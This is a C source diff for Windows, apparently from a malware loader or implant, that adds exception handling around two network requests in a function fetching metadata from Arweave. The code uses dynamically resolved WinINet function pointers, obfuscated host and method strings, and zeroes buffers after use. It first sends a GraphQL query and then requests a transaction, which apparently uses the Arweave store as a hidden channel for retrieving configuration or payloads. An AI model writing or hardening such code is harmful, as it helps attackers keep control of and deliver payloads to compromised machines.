@@ -443,12 +443,17 @@ BOOL FetchArweaveMeta(
         }
 
         DWORD dwGqlLen = 0;
+        PBYTE pGqlResp = NULL;
         LOG("[*] Arweave: entering ArwDoRequest for GraphQL POST");
-        PBYTE pGqlResp = ArwDoRequest(
-            pOpen, pConnect, pHttpOpen, pHttpSend, pRead, pClose, pSetOpt, pQueryOpt,
-            (LPCSTR)xHost, (LPCSTR)xPost, (LPCSTR)xGqlPath,
-            szCtHdr, szGqlBody, (DWORD)StrLenA(szGqlBody), &dwGqlLen
-        );
+        __try {
+            pGqlResp = ArwDoRequest(
+                pOpen, pConnect, pHttpOpen, pHttpSend, pRead, pClose, pSetOpt, pQueryOpt,
+                (LPCSTR)xHost, (LPCSTR)xPost, (LPCSTR)xGqlPath,
+                szCtHdr, szGqlBody, (DWORD)StrLenA(szGqlBody), &dwGqlLen
+            );
+        } __except(EXCEPTION_EXECUTE_HANDLER) {
+            LOG_HEX("[!] Arweave: exception in GraphQL POST, code=", GetExceptionCode());
+        }
         MemSet(szGqlBody, 0, sizeof(szGqlBody));
         LOG("[*] Arweave: ArwDoRequest returned");
 
@@ -514,11 +519,16 @@ BOOL FetchArweaveMeta(
             // Step 3: GET arweave.net/<txid>
             // ============================================================
             DWORD dwDataLen = 0;
-            PBYTE pDataResp = ArwDoRequest(
-                pOpen, pConnect, pHttpOpen, pHttpSend, pRead, pClose, pSetOpt, pQueryOpt,
-                (LPCSTR)xHost, (LPCSTR)xGet, szTxPath,
-                NULL, NULL, 0, &dwDataLen
-            );
+            PBYTE pDataResp = NULL;
+            __try {
+                pDataResp = ArwDoRequest(
+                    pOpen, pConnect, pHttpOpen, pHttpSend, pRead, pClose, pSetOpt, pQueryOpt,
+                    (LPCSTR)xHost, (LPCSTR)xGet, szTxPath,
+                    NULL, NULL, 0, &dwDataLen
+                );
+            } __except(EXCEPTION_EXECUTE_HANDLER) {
+                LOG_HEX("[!] Arweave: exception in TX GET, code=", GetExceptionCode());
+            }
             MemSet(szTxPath, 0, sizeof(szTxPath));
 
             if (pDataResp && dwDataLen >= 60) {
